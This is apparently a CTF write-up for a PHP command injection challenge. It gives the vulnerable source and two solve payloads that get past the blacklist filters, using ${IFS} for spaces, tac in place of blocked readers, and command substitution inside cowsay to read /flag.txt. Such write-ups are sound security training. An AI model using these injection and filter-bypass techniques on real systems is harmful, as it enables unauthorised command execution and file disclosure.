# URL

# Concept
* OS Command Injection
* Filter Bypass
# Source Code
```
<?php 
    if(isset($_POST["cmd"]) && !empty($_POST["cmd"])){
        $cmd = $_POST["cmd"];
        $result;
        if(empty($cmd)){
            $result = "Almeno prova a darmi un comando, dai";
        }
        else{
            if(preg_match('/[#@%^&*_+\[\]:>?~\\\\]/', $cmd)){
                $result = "Stai cercando di hackerarmi usando strani caratteri? Con me non funziona";
            }
            elseif(strlen($cmd) > 70){
                $result = "Alle superiori ho scritto temi meno lunghi di così";
            }
            elseif (strpos($cmd, "cowsay") !== false) {
                $arr = explode('"', $cmd);
                if($arr && !empty($arr) && $arr[1]){
                    $str = $arr[1];
                    if($str && !empty($str)) $result = passthru('cowsay "'.addslashes($str).'"');
                    else $result = "Nope";
                }
                else $result = "Nope";
            }
            elseif(strpos($cmd, "sudo") !== false){
                $result = "Sudi? Fatti una doccia..";
            }
            elseif(strpos($cmd, "echo") !== false){
                $result = "echooo echoo echo ech ec e";
            }
            elseif (strpos($cmd, "cat") !== false) {
                $result = "Miao";
                $result .= "\n   \    /\\";
                $result .= "\n    )  ( ')";
                $result .= "\n   (  /  )";
                $result .= "\n    \(__)|"; 
            }
            elseif (strpos($cmd, " ") !== false){
                $result = "Qui non c'è spazio per gli spazi!";
            }
            elseif (strpos($cmd, "head") !== false || strpos($cmd, "tail") !== false || strpos($cmd, "od") !== false || strpos($cmd, "less") !== false || strpos($cmd, "head") !== false || strpos($cmd, "hexdump") !== false){
                $result = "Vorresti leggere qualcosa? Non penso proprio";
            }
            else{
                $result = exec($cmd);
                $result = substr($result, 0, 10);
            }
        }
        echo $result;
    }
?>  
```
# Method of solve
* the app uses the `cowsay` command to output user input
* the app also has several restricted characters that could potentially be used in a malicious manner
* the biggest restricted character is ` `, but we can get around that filter with the `${IFS}` variable
## Solve Method 1 (By Sicinthemind)
* use command substitution to read the `/flag.txt` file:
```
cowsay "$(/flag.txt)"
```
* this method bypasses the space limiter and other restrictions
## Solve Method 2 (By DeefisModernesLeben)
* most of the commands we use to read files, such as `cat`, `less`, `head`, etc, are restricted
* we can use programs like `tac` or `more` to read files
* and we can get around the ` ` character restriction by using the `${IFS}` variable in bash, which can be a substitute for ` ` in environments where the space character is filtered
```
tac${IFS}/flag.txt
```
* but there's a problem with the output, because the app only prints out the first 10 characters of the result:
```
else{
                $result = exec($cmd);
                $result = substr($result, 0, 10);
    }
```
* we can get around this problem by by piping the output of the command into `cut`
```
tac${IFS}/flag.txt|cut${IFS}-c10-20
```
* repeat until you have the entire flag
